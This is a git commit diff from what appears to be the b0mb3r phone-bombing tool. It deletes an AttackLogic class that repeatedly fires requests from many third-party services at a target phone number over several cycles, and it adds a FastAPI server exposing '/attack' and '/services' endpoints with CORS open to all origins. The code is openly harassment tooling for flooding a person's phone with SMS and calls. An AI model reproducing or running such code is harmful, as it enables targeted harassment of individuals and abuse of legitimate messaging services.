d9628d8c17c7e38082f0aab66a14a3e314ed9714
kototronik <83447310+kototronik@users.noreply.github.com>
2021-04-30 20:22:08 +0900

    Add files via upload

--- main.py
+++ main.py
@@ -1,58 +1,22 @@
-import asyncio
-from datetime import datetime
+import os
+from os.path import join
 
-from loguru import logger
+from fastapi import FastAPI
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.staticfiles import StaticFiles
 
-from b0mb3r.app.status import status
-from b0mb3r.service import prepare_services
-from b0mb3r.utils import await_with_callback
+from b0mb3r.app.routers import attack, services, index
 
+app = FastAPI(title="b0mb3r")
 
-class AttackLogic:
-    def __init__(
-        self, attack_id: str, number_of_cycles: int, country_code: int, phone: str
-    ):
-        self.attack_id = attack_id
-        self.number_of_cycles = number_of_cycles
-        self.country_code = country_code
-        self.phone = phone
+app.add_middleware(
+    CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"],
+)
 
-    @logger.catch
-    async def perform_attack(self):
-        try:
-            await self._perform_attack()
-        except asyncio.CancelledError:
-            pass
+app.mount(
+    "/static", StaticFiles(directory=join(os.getcwd(), "app", "static")), name="static"
+)
 
-    async def _perform_attack(self):
-        services = prepare_services()
-        usable_services = services.get(self.country_code, services["other"])
-
-        status[self.attack_id]["started_at"] = datetime.now().isoformat()
-        status[self.attack_id]["end_at"] = len(usable_services) * self.number_of_cycles
-
-        logger.info(f"Starting attack {self.attack_id} on +{self.phone}...")
-
-        for cycle in range(self.number_of_cycles):
-            logger.info(f"Started cycle {cycle + 1} of attack {self.attack_id}")
-
-            tasks = [
-                await_with_callback(
-                    service(self.phone, self.country_code).run(),
-                    update_count,
-                    attack_id=self.attack_id,
-                )
-                for service in usable_services
-            ]
-
-            for task in asyncio.as_completed(tasks):
-                await task
-
-        logger.success(f"Attack {self.attack_id} on +{self.phone} ended")
-
-
-@logger.catch
-def update_count(attack_id: str):
-    if status[attack_id]["currently_at"] is None:
-        status[attack_id]["currently_at"] = 0
-    status[attack_id]["currently_at"] += 1
+app.include_router(attack.router, prefix="/attack", tags=["attack"])
+app.include_router(services.router, prefix="/services", tags=["services"])
+app.include_router(index.router)
